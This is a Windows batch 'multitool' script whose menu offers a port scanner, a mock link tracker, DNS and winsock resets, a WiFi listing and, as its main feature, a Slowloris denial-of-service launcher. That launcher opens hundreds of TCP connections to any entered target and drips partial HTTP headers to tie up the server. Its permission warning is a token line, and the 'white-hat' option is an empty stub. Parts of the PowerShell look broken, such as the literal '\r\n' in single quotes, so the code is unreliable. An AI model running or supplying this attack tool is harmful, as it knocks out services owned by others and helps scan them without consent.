@echo off
title AC's MultiTool 0.1.1 - Slowloris Edition - by AC
color 0a
mode con: cols=95 lines=38

echo.
echo  ============================================
echo       AC HOLDINGS MULTITOOL 0.1.1
echo       Chaos Edition - Slowloris - by AC
echo  ============================================
echo.

:menu
echo.
echo  [1] Port Scanner
echo  [2] Grabify-style Link Tracker
echo  [3] DNS Cleaner
echo  [4] WiFi Scanner
echo  [5] Slowloris Attack
echo  [6] About
echo  [0] Exit
echo.
set /p choice="Choose option: "

if "%choice%"=="1" goto portscan
if "%choice%"=="2" goto grabify
if "%choice%"=="3" goto dnsclean
if "%choice%"=="4" goto wifiscan
if "%choice%"=="5" goto slowloris
if "%choice%"=="6" goto about
if "%choice%"=="0" exit
goto menu

:portscan
cls
echo [AC] Port Scanner
set /p target="Enter target IP or domain: "
set /p startport="Start port (default 1): "
set /p endport="End port (default 1024): "
if "%startport%"=="" set startport=1
if "%endport%"=="" set endport=1024

echo Scanning %target%...
for /L %%p in (%startport%,1,%endport%) do (
    powershell -command "(New-Object System.Net.Sockets.TcpClient).Connect('%target%', %%p)" >nul 2>&1 && echo [OPEN] Port %%p
)
pause
goto menu

:grabify
cls
echo [AC] Grabify-style Link Tracker
set /p url="Enter link to track: "
echo.
echo Tracking link: %url%?ref=ac_multitool
echo.
echo When clicked, check your logger.
pause
goto menu

:dnsclean
cls
echo [AC] DNS Cleaner
ipconfig /flushdns
netsh int ip reset >nul 2>&1
netsh winsock reset >nul 2>&1
echo DNS cache flushed.
pause
goto menu

:wifiscan
cls
echo [AC] WiFi Scanner
netsh wlan show networks
echo.
netsh wlan show interfaces
pause
goto menu

:slowloris
cls
echo [AC] Slowloris Attack - Full Chaos Mode
echo.
echo  [WARNING] Use only on systems you own or have explicit permission.
echo.
echo  [1] Launch Full Slowloris
echo  [2] White-Hat Probe (localhost only)
echo  [3] Back to menu
echo.
set /p slchoice="Choose: "
if "%slchoice%"=="1" goto slowloris_full
if "%slchoice%"=="2" goto slowloris_run
goto menu

:slowloris_full
cls
echo [AC] FULL SLOWLORIS LAUNCH
set /p target="Target (IP or domain): "
set /p port="Port [80]: "
if "%port%"=="" set port=80
set /p conns="Connections (50-500) [200]: "
if "%conns%"=="" set conns=200
set /p delay="Delay ms between bytes [800]: "
if "%delay%"=="" set delay=800

echo.
echo Mrrp~ Launching %conns% connections against %target%:%port%
echo Keep this window open. Ctrl+C to stop.
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
$target='%target%'; $port=%port%; $conns=%conns%; $delay=%delay%; ^
$header = 'GET / HTTP/1.1\r\nHost: ' + $target + '\r\nUser-Agent: AC-Slowloris-0.1.1\r\n'; ^
$clients = @(); ^
for($i=0; $i -lt $conns; $i++) { ^
    try { ^
        $c = New-Object System.Net.Sockets.TcpClient; ^
        $c.Connect($target, $port); ^
        $s = $c.GetStream(); ^
        $clients += @{Client=$c; Stream=$s; Sent=0; Alive=$true}; ^
        Write-Host '[+] Connection' ($i+1) 'open' -ForegroundColor Green ^
    } catch { Write-Host '[-] Failed' ($i+1) } ^
} ^
if ($clients.Count -eq 0) { Write-Host 'No connections!'; exit } ^
Write-Host '[AC] Slowloris running... sending partial headers slowly' -ForegroundColor Yellow ^
while($true) { ^
    $alive = 0; ^
    foreach($conn in $clients) { ^
        if (-not $conn.Alive) { continue } ^
        try { ^
            if ($conn.Sent -lt $header.Length) { ^
                $chunk = [Text.Encoding]::ASCII.GetBytes($header[$conn.Sent]); ^
                $conn.Stream.Write($chunk, 0, 1); ^
                $conn.Sent++; ^
                $alive++ ^
            } ^
        } catch { $conn.Alive = $false; try { $conn.Client.Close() } catch {} } ^
    } ^
    Write-Host '[*] Alive connections:' $alive -ForegroundColor Cyan; ^
    Start-Sleep -Milliseconds $delay ^
}
pause
goto slowloris

:slowloris_run
cls
echo [AC] Slow-Header Probe (White-Hat)
:: (your original white-hat code here if you want to keep it)
echo White-hat probe coming soon...
pause
goto slowloris

:about
cls
echo AC's MultiTool 0.1.1 - Slowloris Edition
echo.
echo Made with pure chaos and cat energy.
echo Part of AC Holdings MultiTools collection.
echo.
echo by AC - 2026
echo.
pause
goto menu
